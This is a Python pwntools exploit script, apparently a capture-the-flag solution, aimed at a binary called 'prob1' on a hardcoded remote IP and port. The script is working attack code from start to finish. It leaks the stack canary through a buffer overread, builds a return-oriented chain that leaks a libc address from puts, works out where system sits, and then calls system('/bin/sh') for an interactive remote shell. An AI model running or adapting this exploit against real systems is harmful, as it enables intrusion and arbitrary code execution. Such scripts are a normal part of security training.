from pwn import *
context.terminal = ['tmux','splitw','-h']
#context.log_level = 'debug'

lib = ELF("./libc6_2.23-0ubuntu10_amd64.so")
elf = ELF("./prob1")

#p = process("./prob1")
p = remote("143.248.249.153",4012)

script = '''
b *0x400a96
'''

def give(data):
    global p 
    p.sendline("1")
    print p.recvuntil("> ")
    p.sendline(data)
    print p.recvuntil("> ")

def exit():
    global p 
    p.sendline("3")
    print p.recvuntil("service\n")
    data = p.recvuntil("=")
    p.recvuntil("> ")
    return data

def check():
    global p
    p.sendline("2")
    print p.recvuntil("well?")
    print p.recvuntil("\n")
    print p.recvuntil("\n")
    data =  p.recvuntil("=")
    #info("ex")
    print p.recvuntil("> ")
    return data


dummy = "A"*168
canary = 0
puts_plt=0x4008cc
puts_got=0x602018
main=0x400A96

offset = 0x6f690
binsh_offset = 0x18cd57

pop_rdi = 0x400ea3

libc_base = 0
libc_puts = 0 
libc_system = 0

info("leak canary")
print p.recvuntil("> ")
give("A"*168)
data = check()
canary = (u64(data[168:176])>>8)<<8
print "canary = {}".format(hex(canary))

info("leak libc")
payload = dummy + p64(canary) + "CCCCCCCC" + p64(pop_rdi) 
payload += p64(puts_got) + p64(puts_plt) + p64(main)
give(payload)
leak = exit()

libc_puts = u64(leak)&0xffffffffffff
libc_base = libc_puts - offset
libc_system = libc_base + 0x45390

print "puts leak = {}".format(hex(libc_puts))
print "libc base = {}".format(hex(libc_base))

info("call system")
payload = dummy + p64(canary) + "CCCCCCCC" + p64(pop_rdi)
payload += p64(libc_base+binsh_offset) + p64(libc_system)
give(payload)
p.sendline("3")


p.interactive()




